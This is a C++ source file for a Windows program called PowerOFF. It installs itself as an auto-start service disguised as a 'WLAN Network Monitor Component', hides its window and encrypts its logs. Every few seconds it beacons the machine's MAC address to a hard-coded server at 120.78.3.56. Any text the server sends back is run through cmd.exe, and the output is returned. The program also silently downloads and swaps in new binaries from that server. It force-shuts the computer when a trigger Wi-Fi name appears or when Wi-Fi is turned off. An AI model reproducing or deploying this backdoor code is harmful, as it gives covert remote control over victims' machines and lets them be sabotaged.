// PowerOFF.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <shellapi.h>
#include <wlanapi.h>
#include <urlmon.h> // 添加URL下载支持
#include <iphlpapi.h> // 添加获取MAC支持
#include <wininet.h> // 添加网络缓存清除支持

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "urlmon.lib") // 链接网络下载库
#pragma comment(lib, "iphlpapi.lib") // 链接网络信息库
#pragma comment(lib, "wininet.lib") // 链接缓存控制库

// ==============================================================
// 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
#define MANUAL_COMPILE_VERSION "1.1.2"
// ==============================================================

// 定义当前程序版本和服务器更新地址
const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION; 
const std::string UPDATE_URL_BASE = "http://120.78.3.56:5000/update/"; // 对齐5000端口
const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report"; // 匹配服务器上的 5000 端口

// 全局单例互斥锁句柄，放于最顶部方便所有函数调用
HANDLE g_hMutex = NULL;

// 指定为Windows子系统，运行时不显示控制台黑窗
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

// 判断当前是否以管理员身份运行
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin == TRUE;
}

// 获取当前时间的字符串表示用于记录日志
std::string GetCurrentTimeStr() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buffer[256];
    sprintf_s(buffer, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(buffer);
}

// 获取当前程序的完整运行路径
std::string GetExePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// 简单XOR加密并将结果转为Hex编码，防止别人直接通过文本读取
std::string EncryptLogString(const std::string& data) {
    std::string key = "PowerOFF2026"; // 你的专属加密密钥
    std::string result = "";
    char hexBuf[5];
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char xorChar = static_cast<unsigned char>(data[i]) ^ key[i % key.size()];
        sprintf_s(hexBuf, "%02X", xorChar);
        result += hexBuf;
    }
    return result;
}

// 写入日志到程序同目录下的 WlanMonitorSvc_Log.txt
void WriteLog(const std::string& message) {
    std::string exePath = GetExePath();
    std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";

    // 限制日志大小，超过则清空（防止日志无限增长）
    std::ifstream checkFile(logPath, std::ios::ate | std::ios::binary);
    bool isTooLarge = false;
    if (checkFile.is_open()) {
        if (checkFile.tellg() > 2 * 1024 * 1024) { // 大于2MB
            isTooLarge = true;
        }
        checkFile.close();
    }

    std::ofstream logFile(logPath, isTooLarge ? std::ios::trunc : std::ios::app);
    if (logFile.is_open()) {
        std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
        // 暂时取消加密，直接输出明文日志
        //logFile << rawLog << std::endl;//无加密
        logFile << EncryptLogString(rawLog) << std::endl;//有加密
        logFile.close();
    }
}

// 注册为 Windows 服务以实现静默自启，伪装成合法网络监控组件
void InstallAndStartService() {
    std::string exePath = GetExePath();
    WriteLog("正在尝试注册 Windows 服务...");

    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        WriteLog("失败：无法打开服务控制管理器，错误代码: " + std::to_string(GetLastError()));
        return;
    }

    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "WlanMonitorSvc",                   // 正常名称，不带有任何 poweroff
        "WLAN Network Monitor Component",   // 普通的显示名称
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,                 // 开机自启
        SERVICE_ERROR_NORMAL,
        exePath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (hService) {
        WriteLog("成功：Windows 服务注册成功！");
        // 释放锁，允许 SCM 启动的服务进程能够正常通过多开检测
        if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            WriteLog("提示：服务已存在，尝试更新路径并启动它...");
            hService = OpenServiceA(hSCManager, "WlanMonitorSvc", SERVICE_ALL_ACCESS);
            if (hService) {
                // 停止现存服务
                SERVICE_STATUS status;
                ControlService(hService, SERVICE_CONTROL_STOP, &status);
                Sleep(2000); // 稍微等待结束

                // 更新服务执行路径
                ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, exePath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);

                if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
                StartService(hService, 0, NULL);
                CloseServiceHandle(hService);
            }
        } else {
            WriteLog("失败：注册服务失败，错误代码: " + std::to_string(err));
        }
    }
    CloseServiceHandle(hSCManager);

    // 清理以前遗留的各类计划任务和注册表项
    std::string oldTaskParams = "/delete /tn \"\\Microsoft\\Windows\\AppID\\PolicyConverter\" /f";
    SHELLEXECUTEINFOA delSei = { sizeof(delSei) };
    delSei.lpVerb = "open";
    delSei.lpFile = "schtasks.exe";
    delSei.lpParameters = oldTaskParams.c_str();
    delSei.nShow = SW_HIDE;
    ShellExecuteExA(&delSei);
    
    oldTaskParams = "/delete /tn \"PowerOFF_AutoStart\" /f";
    delSei.lpParameters = oldTaskParams.c_str();
    ShellExecuteExA(&delSei);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "PowerOFF_AutoStart");
        RegCloseKey(hKey);
    }
}

// UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
std::string Utf8ToAnsi(const std::string& utf8Str) {
    if (utf8Str.empty()) return "";
    int wLen = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, NULL, 0);
    if (wLen <= 0) return utf8Str;
    std::wstring wStr(wLen, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wStr[0], wLen);
    int aLen = WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (aLen <= 0) return utf8Str;
    std::string aStr(aLen, 0);
    WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, &aStr[0], aLen, NULL, NULL);
    return std::string(aStr.c_str()); 
}

// 调用底层API进行强制关机
void ForceShutdown() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 获取进程令牌
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // 获取关机特权 LUID
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // 赋予当前进程关机特权
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    }

    // 发送关机命令 (EWX_POWEROFF 关闭并断电 | EWX_FORCE 强制关闭应用不提示)
    ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);

    // 备用方案：隐藏调用系统shutdown命令兜底
    WinExec("shutdown.exe -s -f -t 0", SW_HIDE);
}

// 检查并执行自动更新
void CheckForUpdates() {
    std::string timestamp = std::to_string(GetTickCount64());
    std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp;
    std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp;
    std::string tempVersionFile = GetExePath() + ".ver";

    WriteLog("【更新】开始连接服务器检查自动更新...");

    // 1. 清除系统自带的IE网络缓存，否则会一直读取到旧的缓存内容
    DeleteUrlCacheEntryA(versionUrl.c_str());
    DeleteUrlCacheEntryA(exeUrl.c_str());

    // 尝试下载 version.txt
    HRESULT hr = URLDownloadToFileA(NULL, versionUrl.c_str(), tempVersionFile.c_str(), 0, NULL);
    if (hr == S_OK) {
        std::ifstream verFile(tempVersionFile);
        std::string latestVersion;
        if (verFile >> latestVersion) {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());

            WriteLog("【更新】成功获取服务器最新版本: [" + latestVersion + "]，当前本地版本: [" + CURRENT_VERSION + "]");

            // 比较版本号（要求服务器端字符串不为空且不等于当前版本）
            if (!latestVersion.empty() && latestVersion != CURRENT_VERSION) {
                WriteLog("【更新】发现新版本: [" + latestVersion + "] (当前版本: [" + CURRENT_VERSION + "])，正在后台静默下载...");

                std::string newExePath = GetExePath() + ".new";
                hr = URLDownloadToFileA(NULL, exeUrl.c_str(), newExePath.c_str(), 0, NULL);
                if (hr == S_OK) {
                    WriteLog("【更新】新版本下载完成，正在应用更新并重启...");

                    std::string currentExePath = GetExePath();
                    std::string oldExePath = currentExePath + ".old";

                    // 删除以前残留的 old 文件
                    DeleteFileA(oldExePath.c_str());

                    // Windows 下不能直接删除正在运行的 exe，但可以重命名
                    if (MoveFileA(currentExePath.c_str(), oldExePath.c_str())) {
                        // 将下载的新版本重命名为正确的程序名
                        if (MoveFileA(newExePath.c_str(), currentExePath.c_str())) {

                            // 【关键修复】关闭旧进程占用的互斥锁，否则新进程一旦启动就会因为防多开机制而立刻自杀！
                            if (g_hMutex) {
                                CloseHandle(g_hMutex);
                                g_hMutex = NULL;
                            }

                            // 通过 CMD 后台异步发起服务重启操作
                            // 此时由于程序身份已经是 Windows 服务，绝不能直接去 open 执行 .exe
                            // 我们丢出一个等效延迟(利用ping)的CMD命令，等待自身彻底 exit 退出并被 SCM 释放资源后，再由 SCM 重新安全地把它当成服务拉起。
                            std::string restartCmd = "/c ping 127.0.0.1 -n 4 > nul & net start WlanMonitorSvc";
                            SHELLEXECUTEINFOA sei = { sizeof(sei) };
                            sei.lpVerb = "open"; 
                            sei.lpFile = "cmd.exe"; 
                            sei.lpParameters = restartCmd.c_str(); 
                            sei.nShow = SW_HIDE;                
                            ShellExecuteExA(&sei);

                            // 立刻退出旧程序实例，Windows 服务管理器(SCM)会感知到服务停止，随后被上方CMD拉起
                            exit(0);
                        }
                    }
                } else {
                    WriteLog("【更新】版本文件新二进制文件获取失败，HRESULT: " + std::to_string(hr));
                }
            } else {
                WriteLog("【更新】检测完毕，未发现新版本，当前处于最新。");
            }
        } else {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());
            WriteLog("【更新】读取版本文件发现内容为空。");
        }
    } else {
        WriteLog("【更新】无法连接到服务器获取版本信息(version.txt)，HRESULT: " + std::to_string(hr));
    }
}

// 获取网卡MAC地址（通常用来唯一标识一台电脑）
std::string GetMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS) return "UNKNOWN_MAC";

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    char macAddr[18];
    sprintf_s(macAddr, "%02X-%02X-%02X-%02X-%02X-%02X",
        pAdapterInfo->Address[0], pAdapterInfo->Address[1],
        pAdapterInfo->Address[2], pAdapterInfo->Address[3],
        pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

    return std::string(macAddr);
}

// URL 编码辅助函数
std::string UrlEncode(const std::string& str) {
    std::string encoded = "";
    char buf[4];
    for (unsigned char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += '+';
        } else {
            sprintf_s(buf, "%%%02X", c);
            encoded += buf;
        }
    }
    return encoded;
}

// 执行CMD命令并获取输出结果
std::string ExecCmd(const std::string& cmd) {
    std::string result = "";
    std::string full_cmd = "cmd.exe /c " + cmd + " 2>&1";
    std::string mutable_cmd = full_cmd; // CreateProcess需要可变的字符串指针

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "CreatePipe failed!";
    }
    // 确保读取端不被子进程继承，否则读管道可能会堵塞
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // 强制隐藏窗口

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // 使用 CREATE_NO_WINDOW 彻底不创建控制台窗口
    if (!CreateProcessA(NULL, &mutable_cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "CreateProcess failed!";
    }

    CloseHandle(hWrite); // 必须在读取前先关闭自身的写入端，否则会导致死锁

    DWORD dwRead;
    CHAR chBuf[512];
    while (ReadFile(hRead, chBuf, sizeof(chBuf) - 1, &dwRead, NULL) && dwRead > 0) {
        chBuf[dwRead] = '\0';
        result += chBuf;
    }

    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // CMD默认输出是GBK编码，转为UTF-8防止网页端中文乱码
    int wLen = MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, NULL, 0);
    if (wLen > 0) {
        std::wstring wStr(wLen, 0);
        MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, &wStr[0], wLen);
        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
        if (utf8Len > 0) {
            std::string utf8Str(utf8Len, 0);
            WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
            while(!utf8Str.empty() && utf8Str.back() == '\0') utf8Str.pop_back();
            return utf8Str;
        }
    }
    return result;
}

// 向服务端提交执行结束的终端输出结果
void SendOutputToServer(const std::string& mac, const std::string& output) {
    std::string postData = "mac=" + UrlEncode(mac) + "&output=" + UrlEncode(output);
    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/cmd_result", NULL, NULL, NULL, 0, 1);
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

// 存放服务器返回的此台电脑备注名，并在后续用于关机判断
std::string g_CustomMyName = "";

// 字符串去除首尾空白和换行符（容错处理）
void TrimString(std::string &s) {
    if (s.empty()) return;
    s.erase(0, s.find_first_not_of(" \t\r\n"));
    s.erase(s.find_last_not_of(" \t\r\n") + 1);
}

// 向服务器报备上线
void ReportToServer() {
    std::string mac = GetMacAddress();
    std::string reportUrl = REPORT_URL_BASE + "?mac=" + mac + "&ver=" + CURRENT_VERSION + "&t=" + std::to_string(GetTickCount64());

    IStream* stream = NULL;
    HRESULT hr = URLOpenBlockingStreamA(0, reportUrl.c_str(), &stream, 0, 0);
    if (hr == S_OK && stream != NULL) {
        char buffer[1024];
        ULONG bytesRead;
        std::string response = "";
        while (SUCCEEDED(stream->Read(buffer, sizeof(buffer) - 1, &bytesRead)) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
        stream->Release();

        TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上

        // 检测心跳回调是否携带了需要执行的操作命令
        if (!response.empty() && response != "Missing parameters") {
            if (response.find("SSID:") != std::string::npos) {
                // 如果包含 SSID:XXX，则更新存入本地内存的自定义名字
                size_t pos = response.find("SSID:");
                g_CustomMyName = response.substr(pos + 5);
                TrimString(g_CustomMyName); // 去除可能混入的换行或空白
            } else if (response.find("UPDATE_NOW") != std::string::npos) {
                WriteLog("收到服务端紧急下发的全局更新指令，立即启动更新程序！");
                CheckForUpdates();
            } else {
                WriteLog("收到远程强制执行命令: " + response);
                std::string output = ExecCmd(response);
                SendOutputToServer(mac, output);
            }
        }
    }
}

// 5秒循环检测WiFi是否存在并检测 OFFALL 热点
void MonitorWiFiLoop() {
    WriteLog("开始后台监测WiFi(每5s一次，扫描日志改为每10分钟精简打印一次防刷屏)...");

    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);

    ULONGLONG lastLogTime = 0;
    ULONGLONG wifiOffStartTime = 0; // 记录WiFi处于关闭状态的起始时间
    ULONGLONG lastUpdateCheckTime = 0; // 记录上次检查更新的时间

    // 启动时清理以前因更新遗留的 .old 文件
    DeleteFileA((GetExePath() + ".old").c_str());

    while (true) {
        // 每5秒向服务器发送一次心跳
        ReportToServer();

        if (dwResult != ERROR_SUCCESS) {
            dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        }

        bool foundOffAll = false;
        bool isWifiOff = false; // 当前刻是否无WiFi

        ULONGLONG currentTime = GetTickCount64();
        bool shouldLog = false;
        // 10 分钟 = 10 * 60 * 1000 毫秒 = 600000
        if (lastLogTime == 0 || (currentTime - lastLogTime >= 600000)) {
            shouldLog = true;
            lastLogTime = currentTime;
        }

        // 10 分钟检查一次自动更新 = 10 * 60 * 1000 = 600000 毫秒
        // 首次运行也会触发一次检测（由于 lastUpdateCheckTime = 0）
        if (lastUpdateCheckTime == 0 || (currentTime - lastUpdateCheckTime >= 600000)) {
            // 将更新检查放到专门的函数中执行，不阻塞主循环太久
            CheckForUpdates();
            lastUpdateCheckTime = currentTime;
        }

        if (dwResult == ERROR_SUCCESS) {
            PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
            if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
                if (shouldLog) WriteLog("本次循环(10分钟定期): 检测到 WiFi 网卡设备数量 = " + std::to_string(pIfList->dwNumberOfItems));

                if (pIfList->dwNumberOfItems == 0) {
                    isWifiOff = true; // 无网卡=WiFi关
                } else {
                    bool hasAnyVisibleNetwork = false;
                    for (int i = 0; i < (int) pIfList->dwNumberOfItems; i++) {
                        PWLAN_INTERFACE_INFO pIfInfo = (PWLAN_INTERFACE_INFO) &pIfList->InterfaceInfo[i];

                        // 如果接口处于禁用或断开状态（例如飞行模式），API 可能直接返回错误，我们默认视为关闭并执行检测容错
                        // 强制调用网卡扫描周围的WiFi（如果不调用，获取到的列表是系统的旧缓存从而只有几个或者搜不到最新热点）
                        WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, NULL, NULL);

                        PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
                        // 获取周围可见的所有WiFi网络
                        DWORD dwRet = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid, 0, NULL, &pBssList);
                        if (dwRet == ERROR_SUCCESS && pBssList != NULL) {
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 获取到周围可见 WiFi 数量: " + std::to_string(pBssList->dwNumberOfItems));

                            if (pBssList->dwNumberOfItems > 0) {
                                hasAnyVisibleNetwork = true;
                            }

                            for (int j = 0; j < (int) pBssList->dwNumberOfItems; j++) {
                                PWLAN_AVAILABLE_NETWORK pNetwork = (PWLAN_AVAILABLE_NETWORK) & pBssList->Network[j];
                                char ssid[33] = {0};
                                if (pNetwork->dot11Ssid.uSSIDLength > 0 && pNetwork->dot11Ssid.uSSIDLength <= 32) {
                                    memcpy(ssid, pNetwork->dot11Ssid.ucSSID, pNetwork->dot11Ssid.uSSIDLength);

                                    std::string displaySsid = Utf8ToAnsi(ssid);

                                    // 转码为本机的字符串格式存入日志
                                    if (shouldLog) {
                                        WriteLog("        发现网络: [" + displaySsid + "]");
                                    }

                                    if (strcmp(ssid, "OFFALL") == 0) {
                                        foundOffAll = true;
                                        break;
                                    }

                                    // 如果不是 OFFALL，但匹配该电脑最新设定的备注名，同样触发击杀
                                    if (!g_CustomMyName.empty() && displaySsid == g_CustomMyName && g_CustomMyName != "未命名设备") {
                                        foundOffAll = true;
                                        WriteLog("警告：检测到了与本机当前设定的特殊备注名(" + g_CustomMyName + ")同名的 WiFi");
                                        break;
                                    }
                                }
                            }
                            WlanFreeMemory(pBssList);
                        } else {
                            // 如果获取可用网络列表失败（例如 Wi-Fi 开关物理/软件层面关闭了）
                            if (shouldLog) WriteLog("    网卡[" + std::to_string(i) + "] 无法获取网络列表，被视为禁用/关闭状态...");
                        }
                        if (foundOffAll) break;
                    }
                    if (!hasAnyVisibleNetwork) {
                        isWifiOff = true; // 可见网络为0，被认定为飞行模式/WiFi关
                    }
                }
                WlanFreeMemory(pIfList);
            } else {
                if (shouldLog) WriteLog("无法枚举 WiFi 接口，视同关闭。");
                isWifiOff = true;
            }
        } else {
            if (shouldLog) WriteLog("WlanOpenHandle 失败(错误代码: " + std::to_string(dwResult) + ")，视同关闭。");
            isWifiOff = true;
        }

        // 处理WiFi彻底关闭时的5分钟防逃避机制
        if (isWifiOff) {
            if (wifiOffStartTime == 0) {
                wifiOffStartTime = currentTime;
                WriteLog("警告：检测到 WiFi 已关闭/未连接/飞行模式，开始 5 分钟倒计时(300秒)，如果未恢复将关机...");
            } else {
                // 超过 5分钟（300000 毫秒）
                if ((currentTime - wifiOffStartTime) >= 300000) {
                    WriteLog("【严重警告】：WiFi 处于关闭状态已达 5 分钟，立即执行检测逃避强制关机!");
                    ForceShutdown();
                    Sleep(30000); // 缓冲等待系统关机
                }
            }
        } else {
            if (wifiOffStartTime != 0) {
                WriteLog("提示：检测到 WiFi 已重新开启并有信号，取消关机倒计时。");
                wifiOffStartTime = 0; // 重置
            }
        }

        if (foundOffAll) {
            WriteLog("【严重警告】：直接检测到名称为 OFFALL 的WiFi网络，立即执行底层API强制关机!");
            ForceShutdown();
            Sleep(30000); // 缓冲等待系统关机
        }

        Sleep(5000); // 间隔5秒
}

if (hClient != NULL) {
    WlanCloseHandle(hClient, NULL);
}
} // <--- End of MonitorWiFiLoop

// Windows 服务状态支持
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

void WINAPI ServiceCtrlHandler(DWORD dwControl) {
    if (dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        if (g_hMutex) CloseHandle(g_hMutex);
        exit(0); // 直接退出结束进程，因为循环中可能有很多同步阻塞操作
    }
}

void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA("WlanMonitorSvc", ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    WriteLog("【系统服务】Windows 服务 WlanMonitorSvc (服务模式) 开始运行!");
    // 开始进入后台功能检测循环
    MonitorWiFiLoop();

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main()
{
    // 设置全局互斥体，防止多开和多重检测(跨 SYSTEM 账户和普通用户会话)
    SetLastError(0);
    g_hMutex = CreateMutexA(NULL, FALSE, "Global\\WlanMonitorSvc_AutoStart_Mutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 已有实例在运行，直接退出
        if (g_hMutex) CloseHandle(g_hMutex);
        return 0;
    }

    // 尝试以 Windows 服务模式调度 (由 SCM 启动时才会成功)
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {(LPSTR)"WlanMonitorSvc", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
        {NULL, NULL}
    };
    
    if (StartServiceCtrlDispatcherA(ServiceTable)) {
        // 如果成功，说明由 SCM 拉起，并且此函数一直阻塞直到服务停止
        return 0;
    }

    DWORD err = GetLastError();
    if (err != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 其他未知服务注册错误
        return 0;
    }

    // -- 若运行至此，说明是独立双击打开的(非系统服务启动)，进入首次安装提权逻辑 --

    // 如果没有管理员权限，则尝试提权
    if (!IsRunAsAdmin()) {
        WriteLog("========== 尝试提权 ==========");
        WriteLog("检测到非管理员权限，正在请求提权运行以安装服务...");

        std::string exePath = GetExePath();
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";               // 请求管理员权限
        sei.lpFile = exePath.c_str();       // 当前程序路径
        sei.nShow = SW_HIDE;                // 隐藏执行时的黑窗

        if (!ShellExecuteExA(&sei)) {
            err = GetLastError();
            if (err == ERROR_CANCELLED) {
                WriteLog("失败：用户取消了UAC提权提升提示。");
            } else {
                WriteLog("失败：提权失败，错误代码: " + std::to_string(err));
            }
        }
        // 提权后退出当前的非管理员实例
        return 0; 
    }

    WriteLog("========== 程序手动启动 (管理员进入安装模式) ==========");

    // 作为普通管理程序运行时，目标是安装为后台服务并启动
    InstallAndStartService();

    WriteLog("========== 安装动作完毕，原实例退出，交由 Windows SCM 后台管理 ==========\n");
    return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
